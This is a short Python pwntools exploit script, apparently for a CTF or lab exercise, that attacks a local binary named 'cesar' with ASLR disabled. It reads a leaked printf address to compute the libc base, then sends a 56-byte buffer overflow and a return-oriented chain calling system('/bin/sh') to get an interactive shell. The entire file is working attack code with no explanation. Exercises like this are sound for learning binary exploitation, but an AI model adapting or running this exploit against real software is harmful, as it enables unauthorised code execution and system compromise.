#!/usr/bin/python3

# No olvidar quitar ASLR

from pwn import *

printf_offset = 0x0000000000054a20         # printf@@GLIBC_2.2.5
system_offset = 0x0000000000046ed0         # system@@GLIBC_2.2.5
pop_rdi_offset = 0x000000000002658e        # 0x000000000002658e : pop rdi ; ret
sh_offset = 0x183cee            # 17d3f3 /bin/sh

elf = ELF("./cesar")

io = process([elf.path, 'debug']);

context(os = "linux", arch = "amd64")

def exploit(base):
    io.sendline(payload(base))
    io.sendline("13")

def payload(base, size=56):
    pop_rdi = p64(pop_rdi_offset + base_libc)
    sh = p64(sh_offset + base_libc)
    system = p64(system_offset + base_libc)
    return flat(size * 'a',
                pop_rdi,
                sh,
                system,
                endianness="little", word_size=64)

line = str(io.recvline())
line = line.replace('\\n\'', "")
parts = line.split(' ');

printf_a = int(parts[-1], 16)

base_libc = printf_a - printf_offset
exploit(base_libc)

io.interactive()
